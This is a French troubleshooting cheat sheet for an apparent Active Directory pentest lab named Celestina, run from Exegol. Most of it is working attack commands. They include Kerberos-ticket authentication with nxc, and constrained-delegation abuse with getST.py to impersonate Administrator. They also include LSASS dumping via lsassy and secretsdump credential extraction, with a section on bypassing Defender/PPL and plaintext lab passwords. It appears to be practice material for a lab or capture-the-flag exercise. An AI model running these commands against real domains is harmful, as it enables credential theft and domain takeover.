# Kerberos & DNS — dépannage (Celestina / Exegol)

## Symptôme : BloodHound « Falling back to NTLM » / erreur port 88

**Cause** : résolution DNS du DC en FQDN échoue.

**Fix** :

```bash
echo "10.13.37.42 dc-celestina.celestina.shop celestina.shop" | sudo tee -a /etc/hosts
echo "nameserver 10.13.37.42" | sudo tee /etc/resolv.conf
nslookup dc-celestina.celestina.shop
```

## Symptôme : `nxc smb ... -k` ne montre aucun `[+]`

**Cause** : scan par IP avec Kerberos (refusé).

**Fix** : fichier FQDN + `--use-kcache` :

```bash
cat << 'EOF' > targets.txt
WK-010.celestina.shop
WK-020.celestina.shop
WK-030.celestina.shop
WK-044.celestina.shop
WK-101.celestina.shop
WK-111.celestina.shop
WK-123.celestina.shop
WK-124.celestina.shop
WK-132.celestina.shop
WK-137.celestina.shop
WK-155.celestina.shop
WK-202.celestina.shop
WK-222.celestina.shop
WK-234.celestina.shop
dc-celestina.celestina.shop
EOF

export KRB5CCNAME="/root/.nxc/modules/lsassy/TGT_CELESTINA.SHOP_k.udele_krbtgt_CELESTINA.SHOP_XXXX.ccache"
nxc smb targets.txt -u 'k.udele' -k -d celestina.shop --use-kcache
```

## Symptôme : `nxc ldap -k` sans authentification ticket

**Fix** :

```bash
nxc ldap dc-celestina.celestina.shop -u 'k.udele' -d celestina.shop --use-kcache
```

## Symptôme : `getST.py` → `KRB_AP_ERR_BADMATCH`

**Cause** : SPN demandé ≠ `msDS-AllowedToDelegateTo` (souvent `HTTP/WK-155` et non `cifs/`).

**Fix** : essayer dans l'ordre :

```bash
getST.py -dc-ip 10.13.37.42 -spn HTTP/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
getST.py -dc-ip 10.13.37.42 -spn cifs/WK-155.celestina.shop -impersonate Administrator 'celestina.shop/k.cedepte:R3m0t3Pr1v1l3g35@H4nd!'
```

## Symptôme : lsassy « Unable to dump lsass »

**Cause** : Defender / PPL sur la cible.

**Contournements** :

```bash
nxc smb 10.13.37.123 -u 'a.nozer' -p 'C3L3stin4!Us3r' -M lsassy
secretsdump.py celestina.shop/a.nozer:'C3L3stin4!Us3r'@10.13.37.123
```

## Règle d'or

| Protocole | Cible | Identifiant |
|-----------|-------|-------------|
| NTLM / PTH | IP OK | `-H hash` `--local-auth` |
| Kerberos | **FQDN obligatoire** | `-k` `--use-kcache` |
